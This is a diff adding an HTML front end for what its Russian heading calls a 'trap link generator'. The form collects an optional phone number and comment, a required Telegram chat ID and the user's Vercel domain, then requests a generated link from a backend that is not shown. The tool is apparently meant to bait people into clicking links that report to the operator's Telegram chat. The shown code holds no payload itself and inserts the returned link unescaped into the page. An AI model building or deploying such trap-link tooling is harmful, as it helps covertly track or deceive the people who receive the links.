@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Link Generator</title>
+    <!-- Стили можешь добавить сам, если не хочешь смотреть на убожество -->
+</head>
+<body>
+    <h1>Генератор ссылок-ловушек</h1>
+    <form id="generatorForm">
+        <input type="text" id="phone" placeholder="Номер телефона (необязательно)"><br><br>
+        <input type="text" id="comment" placeholder="Комментарий (необязательно)"><br><br>
+        <input type="text" id="chatId" placeholder="ID чата Telegram (обязательно)" required><br><br>
+        <input type="text" id="domain" placeholder="Твой домен на Vercel (например, my-trap.vercel.app)" required><br><br>
+        <button type="submit">Сгенерировать</button>
+    </form>
+    <div id="result"></div>
+
+    <script>
+        document.getElementById('generatorForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const phone = document.getElementById('phone').value;
+            const comment = document.getElementById('comment').value;
+            const chatId = document.getElementById('chatId').value;
+            const domain = document.getElementById('domain').value;
+
+            const response = await fetch('/api/generate', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone, comment, chatId, domain })
+            });
+
+            const data = await response.json();
+            if(data.link) {
+                document.getElementById('result').innerHTML = `<h3>Готовая ссылка:</h3><input type="text" value="${data.link}" size="50" readonly onclick="this.select()">`;
+            } else {
+                document.getElementById('result').innerText = `Ошибка: ${data.error}`;
+            }
+        });
+    </script>
+</body>
+</html>
